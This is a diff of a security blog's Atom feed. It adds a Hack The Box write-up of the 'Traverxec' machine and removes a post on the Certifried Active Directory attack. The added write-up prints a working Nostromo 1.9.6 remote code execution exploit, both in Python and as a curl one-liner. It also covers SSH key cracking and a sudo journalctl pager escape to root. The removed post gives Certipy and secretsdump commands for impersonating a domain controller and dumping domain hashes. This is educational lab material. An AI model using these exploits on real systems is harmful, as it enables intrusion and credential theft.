@@ -1,4 +1,276 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-09-16T14:46:25+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Linux - Easy] - Tabby</title><link href="http://localhost:4000/2022/08/24/Tabby.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Easy] - Tabby" /><published>2022-08-24T00:00:00+02:00</published><updated>2022-08-24T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/24/Tabby</id><content type="html" xml:base="http://localhost:4000/2022/08/24/Tabby.html"><![CDATA[<p><img src="/assets/Tabby/Tabby.png" alt="" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-09-23T13:12:51+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Linux - Easy] - Traverxec</title><link href="http://localhost:4000/2022/08/25/Traverxec.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Easy] - Traverxec" /><published>2022-08-25T00:00:00+02:00</published><updated>2022-08-25T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/25/Traverxec</id><content type="html" xml:base="http://localhost:4000/2022/08/25/Traverxec.html"><![CDATA[<p><img src="/assets/Traverxec/Traverxec.png" alt="" /></p>
+
+<h2 id="summary">Summary</h2>
+<ul>
+  <li><strong>Traverxec</strong> is a <strong>Linux</strong> machine hosting a <strong>web server</strong> called <strong>Nostromo</strong> and has <strong>SSH</strong> port open.</li>
+  <li>The <strong>response headers</strong> from the webserver <strong>reveal its name and version</strong> which happens to be <strong>vulnerable to a Remote Code Execution vulnerability.</strong></li>
+  <li><em>After troubleshooting the exploit and making a few modifications,</em> we get <strong>a shell</strong> as the <code class="language-plaintext highlighter-rouge">www-data</code> user.</li>
+  <li><em>One the box, when going through the files</em> <strong><em>in the webroot,</em></strong> we find the <strong>Nostromo server’s configuration file.</strong></li>
+  <li>It reveals that there’s <strong>an accessible area</strong> within the <code class="language-plaintext highlighter-rouge">david</code> user’s <strong>home directory</strong>. There, we find a <strong>private SSH key</strong> which was <strong>protected by a passphrase.</strong></li>
+  <li>We manage to <strong>crack it</strong> using <code class="language-plaintext highlighter-rouge">john</code> and are able to <strong>login via SSH.</strong></li>
+  <li><em>In</em> <code class="language-plaintext highlighter-rouge">david</code><em>’s home path</em>, we find a <strong>folder containing a Bash script</strong> that issues a <code class="language-plaintext highlighter-rouge">journalctl</code> command with <code class="language-plaintext highlighter-rouge">sudo</code> <strong>privileges</strong> without requiring a password. We <strong>exploit that to get a shell</strong> as <code class="language-plaintext highlighter-rouge">root</code>.</li>
+</ul>
+
+<hr />
+
+<h2 id="nmap">NMAP</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
+|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
+|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
+80/tcp open  http    nostromo 1.9.6
+|_http-title: TRAVERXEC
+|_http-server-header: nostromo 1.9.6
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p><em>from</em> <code class="language-plaintext highlighter-rouge">nmap</code><em>’s output,</em> we notice from the <code class="language-plaintext highlighter-rouge">http-server-header</code> script that the web server is <strong>Nostromo version 1.9.6.</strong></p>
+
+<p><em>but before we check for exploits,</em> we’ll first <strong>take a look at the website</strong> to see what’s there.</p>
+
+<h2 id="the-website">The website</h2>
+<p><img src="/assets/Traverxec/website-home-page.jpg" alt="" /></p>
+
+<p><strong>static content</strong> for the most. Let’s move on :D</p>
+
+<h2 id="searching-and-fixing-exploits">Searching and Fixing Exploits</h2>
+<p>using <code class="language-plaintext highlighter-rouge">searchsploit</code> gets us <strong>two identical matches.</strong></p>
+
+<p><img src="/assets/Traverxec/searchsploit.jpg" alt="" /></p>
+
+<p><em>to go manual,</em> we pick the <strong>2nd Python script</strong> and <strong>look at the exploit code</strong> <em>(after removing the text art for clarity)</em></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="n">help_menu</span> <span class="o">=</span> <span class="s">'</span><span class="se">\r\n</span><span class="s">Usage: cve2019-16278.py &lt;Target_IP&gt; &lt;Target_Port&gt; &lt;Command&gt;'</span>
+
+<span class="k">def</span> <span class="nf">connect</span><span class="p">(</span><span class="n">soc</span><span class="p">):</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="n">connection</span> <span class="o">=</span> <span class="n">soc</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">connection</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="k">break</span>
+            <span class="n">response</span> <span class="o">+=</span> <span class="n">connection</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+    <span class="k">return</span> <span class="n">response</span>
+
+<span class="k">def</span> <span class="nf">cve</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
+    <span class="n">soc</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
+    <span class="n">soc</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0</span><span class="se">\r\n</span><span class="s">Content-Length: 1</span><span class="se">\r\n\r\n</span><span class="s">echo</span><span class="se">\n</span><span class="s">echo</span><span class="se">\n</span><span class="s">{} 2&gt;&amp;1'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="n">soc</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">receive</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">soc</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">receive</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+        <span class="n">cmd</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+
+        <span class="n">cve</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
+
+    <span class="k">except</span> <span class="nb">IndexError</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">help_menu</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>seems straightforward. Just a <strong>POST request</strong>. Let’s give it a try:</p>
+
+<p><img src="/assets/Traverxec/exploit-error.jpg" alt="" /></p>
+
+<p>we get an error :/ But we shouldn’t worry when we’ve got <strong>Google</strong> :)</p>
+
+<p>we search to find this answer on <a href="https://stackoverflow.com/questions/33054527/typeerror-a-bytes-like-object-is-required-not-str-when-writing-to-a-file-in">Stack Overflow</a>:</p>
+
+<p><img src="/assets/Traverxec/stack-overflow-answer.jpg" alt="" /></p>
+
+<p><em>following that,</em> we <strong>modify the code</strong> accordingly</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">cve</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
+    <span class="n">soc</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
+    <span class="n">soc</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0</span><span class="se">\r\n</span><span class="s">Content-Length: 1</span><span class="se">\r\n\r\n</span><span class="s">echo</span><span class="se">\n</span><span class="s">echo</span><span class="se">\n</span><span class="s">{} 2&gt;&amp;1'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="n">soc</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>  <span class="c1"># previously soc.send(payload)
+</span>    <span class="n">receive</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">soc</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">receive</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>then <strong>rerun the exploit</strong></p>
+
+<p><img src="/assets/Traverxec/no-feedback-exploit.jpg" alt="" /></p>
+
+<p><strong>no feedback</strong> at all this time xD</p>
+
+<p><em>But,</em> <strong><em>no feedback doesn’t necessarily mean no effect</em></strong></p>
+
+<p><em>for blind situations like these</em>: it’s good to use something like <code class="language-plaintext highlighter-rouge">wget</code> to <strong>verify code execution.</strong></p>
+
+<p><img src="/assets/Traverxec/code-execution-verified.jpg" alt="" /></p>
+
+<p><strong>we’re good :D</strong> let’s get in with a <strong>netcat reverse shell.</strong></p>
+
+<p><img src="/assets/Traverxec/got-shell.jpg" alt="" /></p>
+
+<p><em>before going any further, since we’re on Linux,</em> it’s nice to <strong>improve our shell</strong>. it’s done in the below steps:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># With whatever Python version you find, import the pty module and spawn a bash pty</span>
+python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span> <span class="o">||</span> python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+<span class="c"># Press CTRL + Z</span>
+<span class="nb">stty </span>raw <span class="nt">-echo</span>
+<span class="nb">fg</span>
+<span class="c"># Press Enter twice</span>
+<span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>/bin/bash <span class="o">&amp;&amp;</span> <span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
+<span class="c"># that's the size that fits my terminal. you can find yours with "stty size"</span>
+<span class="nb">stty </span>rows 51 columns 228
+</code></pre></div></div>
+
+<h2 id="the-nostromo-config-file">The Nostromo config file</h2>
+<p><em>Right after logging in,</em> we go into <code class="language-plaintext highlighter-rouge">/var/nostromo</code> and find a <strong>configuration file</strong> in the <code class="language-plaintext highlighter-rouge">conf</code> folder.</p>
+
+<p><img src="/assets/Traverxec/nostromo-conf.jpg" alt="" /></p>
+
+<p>A <strong>couple of interesting things</strong> show up:</p>
+<ul>
+  <li>a username: <code class="language-plaintext highlighter-rouge">david</code></li>
+  <li>an <code class="language-plaintext highlighter-rouge">.htpasswd</code> file</li>
+  <li>and a section on <code class="language-plaintext highlighter-rouge">HOMEDIRS</code></li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">david</code> was a <strong>local user</strong> on the system</p>
+
+<p><img src="/assets/Traverxec/david-passwd.jpg" alt="" /></p>
+
+<p>the <code class="language-plaintext highlighter-rouge">.htpasswd</code> file contains a hash. we <strong>cracked it</strong> with <code class="language-plaintext highlighter-rouge">john</code> and got a password:</p>
+
+<p><img src="/assets/Traverxec/htpasswd-cracked.jpg" alt="" /></p>
+
+<p>But that password <em>didn’t work</em> for either <code class="language-plaintext highlighter-rouge">root</code> or <code class="language-plaintext highlighter-rouge">david</code>.</p>
+
+<p><img src="/assets/Traverxec/no-cred-reuse-for-htpassword.jpg" alt="" /></p>
+
+<p>so we keep it around just in case..</p>
+
+<h2 id="understanding-the-homedirs-feature">Understanding the HOMEDIRS feature</h2>
+<p><em>previously,</em> we attempted to list the contents of <code class="language-plaintext highlighter-rouge">david</code>’s profile but got denied access.</p>
+
+<p><img src="/assets/Traverxec/david-perm-denied.jpg" alt="" /></p>
+
+<p><em>since the</em> <code class="language-plaintext highlighter-rouge">HOMEDIRS</code> <em>feature would give us access into</em> <code class="language-plaintext highlighter-rouge">david</code><em>’s directory,</em> we take <strong>a quick look</strong> at the <a href="https://www.nazgul.ch/dev/nostromo_man.html">online documentation</a> to understand how to use it:</p>
+
+<p>note: <em>to make the page clearer for reading,</em> you may <strong>edit the CSS</strong> for the man page using the <strong>Chrome Dev Tools.</strong></p>
+
+<p><img src="/assets/Traverxec/editing-site-css-for-clarity.jpg" alt="" /></p>
+
+<p>We find that <strong>we can access a user’s folder over HTTP</strong> using the <code class="language-plaintext highlighter-rouge">~</code> followed by the <code class="language-plaintext highlighter-rouge">username</code>.</p>
+
+<p>another thing is: users <strong>can define a certain directory to be shared</strong> through the <code class="language-plaintext highlighter-rouge">homedirs_public</code> option.</p>
+
+<p><img src="/assets/Traverxec/homedirs_explained.jpg" alt="" /></p>
+
+<p>we saw that one in <code class="language-plaintext highlighter-rouge">nhttpd.conf</code></p>
+
+<p><img src="/assets/Traverxec/public_www.jpg" alt="" /></p>
+
+<p>let’s first check the home directory <strong><em>from the outside</em></strong></p>
+
+<p><img src="/assets/Traverxec/home-dir-website.jpg" alt="" /></p>
+
+<p>there’s nothing in both the <strong>web page</strong> and the <strong>source code.</strong></p>
+
+<p>a <code class="language-plaintext highlighter-rouge">gobuster</code> <strong>brute force</strong> didn’t get us anything new either.</p>
+
+<p><em>Since the</em> <code class="language-plaintext highlighter-rouge">public_www</code> <em>folder</em> <strong>should be</strong> <em>in</em> <code class="language-plaintext highlighter-rouge">david</code><em>’s home directory,</em> we tried to <strong><em>blindly</em></strong> change into it.</p>
+
+<p><img src="/assets/Traverxec/public_www-violated.jpg" alt="" /></p>
+
+<p>And <strong>it worked!</strong> plus we found something that could give us access.</p>
+
+<p>we <strong>copy the archive</strong> to <code class="language-plaintext highlighter-rouge">/tmp</code> where we <strong>extract</strong> it. Inside, we find a <strong>protected</strong> <code class="language-plaintext highlighter-rouge">id_rsa</code> that we need to crack:</p>
+
+<p><img src="/assets/Traverxec/id_rsa_found.jpg" alt="" /></p>
+
+<p>we first <strong>convert</strong> it to a hash using <code class="language-plaintext highlighter-rouge">ssh2john</code> and <strong>crack it</strong> using <code class="language-plaintext highlighter-rouge">john</code> to get a password: “hunter”</p>
+
+<p><img src="/assets/Traverxec/id_rsa_cracked.jpg" alt="" /></p>
+
+<p>we then <strong>changed the permissions</strong> on the SSH key (<code class="language-plaintext highlighter-rouge">chmod 600 &lt;KEY_FILE&gt;</code>) and used it to access the machine as <code class="language-plaintext highlighter-rouge">david</code></p>
+
+<p><img src="/assets/Traverxec/ssh-as-david.jpg" alt="" /></p>
+
+<h2 id="exploiting-sudo-journalctl-for-privesc">Exploiting SUDO journalctl for Privesc</h2>
+<p><em>Right after logging in,</em> we see <strong>a folder that sticks out</strong>: <code class="language-plaintext highlighter-rouge">bin</code></p>
+
+<p>it had a script <code class="language-plaintext highlighter-rouge">server-status.sh</code> and another file called <code class="language-plaintext highlighter-rouge">server-stats.head</code></p>
+
+<p><img src="/assets/Traverxec/bin-folder-plus-script.jpg" alt="" /></p>
+
+<p>looking at their contents:</p>
+
+<p><img src="/assets/Traverxec/bin-files-breakdown.jpg" alt="" /></p>
+
+<p>the <code class="language-plaintext highlighter-rouge">server-stats.head</code> was just ASCII art.</p>
+
+<p>But, within <code class="language-plaintext highlighter-rouge">server-status.sh</code> are all <strong>commands for checking the status of the Nostromo server</strong> <em>just like the name says</em></p>
+
+<p>the <strong>exploitable part</strong> here is the <code class="language-plaintext highlighter-rouge">sudo</code> command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/sudo /usr/bin/journalctl <span class="nt">-n5</span> <span class="nt">-unostromo</span>.service
+</code></pre></div></div>
+
+<p>that’s because <code class="language-plaintext highlighter-rouge">journalctl</code> <strong><em>can be escaped for a shell with the same privileges</em></strong>.</p>
+
+<p>A quick look on <a href="https://gtfobins.github.io/gtfobins/journalctl/#sudo">GTFOBins</a> can confirm that.</p>
+
+<p><img src="/assets/Traverxec/gtfo-bins-journalctl.jpg" alt="" /></p>
+
+<p>the trick is that it <strong><em>“invokes the default pager”.</em></strong></p>
+
+<p>A pager is a <strong>program</strong> that <strong>helps the user view the output of a command</strong> <strong><em>one page at a time</em></strong>.
+This is done by <strong>getting the size of rows of the terminal</strong> and <strong>only displaying that many lines.</strong></p>
+
+<p>Paging tools you’re probably familiar with are <code class="language-plaintext highlighter-rouge">more</code> and <code class="language-plaintext highlighter-rouge">less</code>. Both of which can be <strong><em>escaped for a shell</em></strong> ;]</p>
+
+<p>Let’s first <strong>run the script</strong> to see <em>if it asks for a password or not.</em></p>
+
+<p><img src="/assets/Traverxec/script-test-run.jpg" alt="" /></p>
+
+<p>It ran <strong><em>without prompting us for authentication.</em></strong></p>
+
+<p>this means that the command <code class="language-plaintext highlighter-rouge">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code> is available for <code class="language-plaintext highlighter-rouge">david</code> without him needing to provide a password.</p>
+
+<p><em>To exploit this,</em> we run the command.</p>
+
+<p><strong><em>But because the output is too small,</em></strong> <strong>the pager isn’t called.</strong></p>
+
+<p><img src="/assets/Traverxec/no-pager-invoked.jpg" alt="" /></p>
+
+<p>We use <code class="language-plaintext highlighter-rouge">stty</code> as a quick-and-dirty trick to <strong>shrink our tty.</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty </span>rows 20 columns 20
+</code></pre></div></div>
+
+<p><img src="/assets/Traverxec/pager-invoked.jpg" alt="" /></p>
+
+<p><em>From the highlighted line,</em> we know <strong>we have a pager</strong> which can be <strong>turned into a bash shell</strong> with <code class="language-plaintext highlighter-rouge">!/bin/bash</code></p>
+
+<p><img src="/assets/Traverxec/rooted.jpg" alt="" /></p>
+
+<p><strong>Owned :D</strong></p>
+
+<h2 id="rewriting-the-nostromo-exploit">Rewriting the Nostromo exploit</h2>
+<p><em>After some brief testing, and</em> <strong><em>for the sake of simplicity,</em></strong> we <strong>re-wrote the the exploit</strong> for Nostromo as a <code class="language-plaintext highlighter-rouge">curl</code> one-liner:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> <span class="s1">$'POST'</span> <span class="nt">-H</span> <span class="s1">$'Content-Length: 1'</span> <span class="nt">--data-binary</span> <span class="s1">$'</span><span class="se">\x</span><span class="s1">0d</span><span class="se">\x</span><span class="s1">0aecho</span><span class="se">\x</span><span class="s1">0d</span><span class="se">\x</span><span class="s1">0aecho</span><span class="se">\x</span><span class="s1">0d</span><span class="se">\x</span><span class="s1">0a&lt;COMMAND&gt;'</span> <span class="s1">$'http://&lt;HOSTNAME&gt;:&lt;PORT&gt;/.%0d./.%0d./.%0d./.%0d./bin/sh'</span> <span class="o">&gt;</span>/dev/null
+</code></pre></div></div>
+
+<p><img src="/assets/Traverxec/exploit-rewritten.jpg" alt="" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Linux - Easy] - Tabby</title><link href="http://localhost:4000/2022/08/24/Tabby.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Easy] - Tabby" /><published>2022-08-24T00:00:00+02:00</published><updated>2022-08-24T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/24/Tabby</id><content type="html" xml:base="http://localhost:4000/2022/08/24/Tabby.html"><![CDATA[<p><img src="/assets/Tabby/Tabby.png" alt="" /></p>
 
 <h2 id="summary">Summary</h2>
 <ul>
@@ -3264,97 +3536,4 @@ Host script results:
 
 <p>The creds are good and the box is <strong>owned</strong> :D</p>
 
-<p><img src="/assets/Monteverde/rooted.jpg" alt="rooted" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)</title><link href="http://localhost:4000/2022/05/13/Certifried.html" rel="alternate" type="text/html" title="AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)" /><published>2022-05-13T00:00:00+02:00</published><updated>2022-05-13T00:00:00+02:00</updated><id>http://localhost:4000/2022/05/13/Certifried</id><content type="html" xml:base="http://localhost:4000/2022/05/13/Certifried.html"><![CDATA[<p><img src="/assets/Certifried/Certifried-diagram.jpg" alt="Certifried-diagram" /></p>
-
-<h1 id="the-attack-in-brief">The Attack In Brief</h1>
-<ol>
-  <li>AD Certificates can be used for authentication.</li>
-  <li>Certificates can be generated from <strong>templates</strong> in a <strong>Certificate Signing Request</strong> (CSR).</li>
-  <li>There are <strong>two</strong> types of templates available in <strong>ADCS</strong> by default: User and Computer. They are <strong>accessible to anyone</strong> in the <code class="language-plaintext highlighter-rouge">Domain Users</code> or <code class="language-plaintext highlighter-rouge">Domain Computers</code> groups.</li>
-  <li>The certificates they generate <strong>allow for authentication.</strong></li>
-  <li><em>When generating a certificate for a computer object</em>, the computer template will check that computer’s <code class="language-plaintext highlighter-rouge">DNSHostname</code> property and <strong>will generate the certificate based on it</strong>.</li>
-  <li><strong>Meaning:</strong> <em>if the computer’s</em> <code class="language-plaintext highlighter-rouge">DNSHostname</code> <em>is a Domain Controller’s,</em> you will get a certificate for that <strong>Domain Controller!</strong></li>
-  <li><em>On another note, by default,</em> <strong>any authenticated user</strong> can join up to 10 computers to the domain.</li>
-  <li><em>When a user joins a computer to the domain,</em> he will have the <strong>permission to modify</strong> that computer’s <code class="language-plaintext highlighter-rouge">DNSHostname</code> property.</li>
-  <li><em>Combining the points above,</em> any authenticated user can add a computer to the domain and <em>alter</em> its <code class="language-plaintext highlighter-rouge">DNSHostname</code> to that of a <strong>Domain Controller</strong> and get a certificate as that domain controller.</li>
-  <li><em>Using that certificate,</em> the user <em>can obtain</em> the computer account’s <strong>NTLM</strong> hash which can be used to <em>request a full copy of the domain’s hashes</em> (a.k.a <strong>perform a <code class="language-plaintext highlighter-rouge">DCSync</code> attack</strong>).</li>
-</ol>
-
-<hr />
-
-<h1 id="tools-needed">Tools Needed</h1>
-<ol>
-  <li><a href="https://github.com/ly4k/Certipy">Certipy</a></li>
-  <li><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a></li>
-</ol>
-
-<hr />
-
-<h1 id="lab-setup-and-conditions">Lab Setup And Conditions</h1>
-<h2 id="1-domain-controller-with-adcs-role-installed-dclablocal-192168126129">1. Domain Controller with ADCS Role installed [DC.LAB.Local: 192.168.126.129]</h2>
-<p><img src="/assets/Certifried/dc-with-adcs-installed.jpg" alt="dc-with-adcs-installed" /></p>
-
-<h2 id="2-kali-192168145128">2. Kali [192.168.145.128]</h2>
-<p><img src="/assets/Certifried/kali-machine.jpg" alt="kali-machine" /></p>
-
-<h2 id="3-normal-user-account-no-special-privileges">3. Normal User Account (No Special Privileges)</h2>
-<p><img src="/assets/Certifried/normal-ad-user.jpg" alt="normal-ad-user" /></p>
-
-<hr />
-
-<h1 id="attack-demonstration">Attack Demonstration</h1>
-<h2 id="1-joining-a-machine-account-to-the-domain-with-a-spoofed-dnshostname">1. Joining A Machine Account to The Domain with A Spoofed DNSHostname</h2>
-<p><strong>Command:</strong></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy account create &lt;DOMAIN_FQDN&gt;/&lt;AD_USER&gt;@&lt;DC_IP&gt; <span class="nt">-user</span> <span class="s1">'&lt;NEW_COMPUTER_NAME&gt;'</span> <span class="nt">-dns</span> &lt;DC_FQDN&gt;
-</code></pre></div></div>
-
-<p><img src="/assets/Certifried/creating-computer-with-spoofed-dns-hostname.jpg" alt="creating-computer-with-spoofed-dns-hostname" /></p>
-
-<p><img src="/assets/Certifried/proof-of-dns-hostname-spoofing.jpg" alt="proof-of-dns-hostname-spoofing" /></p>
-
-<h2 id="2-requesting-a-domain-controllers-certificate">2. Requesting A Domain Controller’s Certificate</h2>
-<p>we must first obtain the certificate authority’s name.</p>
-
-<p>This can be done by visiting the <code class="language-plaintext highlighter-rouge">/certsrv</code> web directory on the server with ADCS installed and authenticating.</p>
-
-<p><img src="/assets/Certifried/finding-out-the-ca-name.jpg" alt="finding-out-the-ca-name" /></p>
-
-<p><strong>Command:</strong></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req <span class="nt">-dc-ip</span> &lt;DC_IP&gt; &lt;DOMAIN_FQDN&gt;/<span class="s1">'&lt;ADDED_COMPUTER_NAME_ENDING_WITH_DOLLAR_SIGN&gt;'</span>@&lt;DC_IP&gt; <span class="nt">-ca</span> &lt;CA_NAME&gt; <span class="nt">-template</span> Machine
-</code></pre></div></div>
-
-<p>Password = the same password generated from the computer creation in the previous step</p>
-
-<p><img src="/assets/Certifried/requesting-dc-cert.jpg" alt="requesting-dc-cert" /></p>
-
-<h2 id="3-using-the-domain-controllers-certificate-to-get-its-ntlm-hash">3. Using the Domain Controller’s Certificate To Get its NTLM Hash</h2>
-<p><strong>Command:</strong></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy auth <span class="nt">-pfx</span> &lt;GENERATED_PFX_CERTIFICATE&gt;
-</code></pre></div></div>
-
-<p><img src="/assets/Certifried/got-nt-hash-for-dc.jpg" alt="got-nt-hash-for-dc" /></p>
-
-<h2 id="4-performing-dcsync-as-the-impersonated-domain-controller">4. Performing DCSync As The Impersonated Domain Controller</h2>
-<p><strong>Command:</strong></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secretsdump.py <span class="nt">-just-dc</span> &lt;DOMAIN_FQDN&gt;/<span class="s1">'&lt;DC_NAME_ENDING_WITH_DOLLAR_SIGN&gt;'</span>@&lt;DC_IP&gt; <span class="nt">-hashes</span> :&lt;RETRIEVED_HASH&gt;
-</code></pre></div></div>
-
-<p><img src="/assets/Certifried/dc-sync-with-dc-ntlm-hash.jpg" alt="dc-sync-with-dc-ntlm-hash" /></p>
-
-<hr />
-
-<h1 id="mitigation">Mitigation</h1>
-<ol>
-  <li>Applying the patch released by Microsoft <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923">here</a>.</li>
-  <li>Reducing certificate template permissions.</li>
-  <li>Reducing the default user’s machine quota to zero. Only Administrators should have this privilege.</li>
-</ol>
-
-<hr />
-
-<h1 id="references-and-credits">References and Credits</h1>
-<ul>
-  <li><strong>Will Schroeder</strong> and <strong>Lee Christensen</strong> who wrote the paper that started it all <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">here</a></li>
-  <li><a href="https://twitter.com/ly4k_">Oliver Lyak</a> who discovered, reported and explained the vulnerability <a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4">here</a> as well as created the <code class="language-plaintext highlighter-rouge">Certipy</code> tool.</li>
-  <li><strong>SecureAuthCorp</strong> for the awesome <strong>Impacket</strong> scripts of course :D</li>
-</ul>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
+<p><img src="/assets/Monteverde/rooted.jpg" alt="rooted" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
